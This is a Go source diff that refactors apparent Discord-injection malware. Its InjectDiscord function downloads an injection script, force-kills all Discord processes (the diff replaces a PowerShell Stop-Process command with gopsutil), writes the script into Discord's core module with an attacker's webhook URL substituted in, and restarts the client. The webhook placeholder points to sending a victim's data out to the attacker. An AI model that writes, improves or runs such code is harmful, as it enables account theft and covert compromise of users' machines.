@@ -9,9 +9,32 @@ import (
 	"path/filepath"
 	"regexp"
 	"strings"
+
+	"github.com/shirou/gopsutil/v3/process"
 )
 
-// Inject downloads the injection script, kills any running Discord processes via PowerShell,
+// killDiscordProcesses iterates through all processes and kills any process whose name contains "discord" (case insensitive).
+func killDiscordProcesses() {
+	procs, err := process.Processes()
+	if err != nil {
+		// Optionally log or handle error; here we just return.
+		return
+	}
+
+	for _, proc := range procs {
+		name, err := proc.Name()
+		if err != nil {
+			continue
+		}
+
+		if strings.Contains(strings.ToLower(name), "discord") {
+			// Attempt to kill the process; ignore errors.
+			_ = proc.Kill()
+		}
+	}
+}
+
+// InjectDiscord downloads the injection script, kills any running Discord processes via gopsutil,
 // injects the code into Discord’s core, and restarts Discord. The provided webhook URL is
 // inserted into the injection code.
 func InjectDiscord(webhook string) error {
@@ -41,12 +64,8 @@ func InjectDiscord(webhook string) error {
 	}
 	code := string(codeBytes)
 
-	// Kill all processes with "discord" in their name using PowerShell.
-	// The command lists processes whose ProcessName matches "*discord*" and forcefully stops them.
-	psCmd := `Get-Process | Where-Object {$_.ProcessName -like '*discord*'} | Stop-Process -Force`
-	killCmd := exec.Command("powershell", "-Command", psCmd)
-	// We ignore any error (for example, if no matching processes are found).
-	_ = killCmd.Run()
+	// Kill all Discord processes using gopsutil.
+	killDiscordProcesses()
 
 	// Iterate over each potential Discord installation directory.
 	for _, dir := range discordDirs {
@@ -60,9 +79,7 @@ func InjectDiscord(webhook string) error {
 			continue
 		}
 
-		// Replace the placeholder text in the injection code.
-		// "discord_desktop_core-1" is replaced with the actual version (the module folder name)
-		// and "%WEBHOOK%" is replaced with the provided webhook URL.
+		// Replace placeholders in the injection code.
 		modifiedCode := strings.ReplaceAll(code, "discord_desktop_core-1", version)
 		modifiedCode = strings.ReplaceAll(modifiedCode, "%WEBHOOK%", webhook)
 
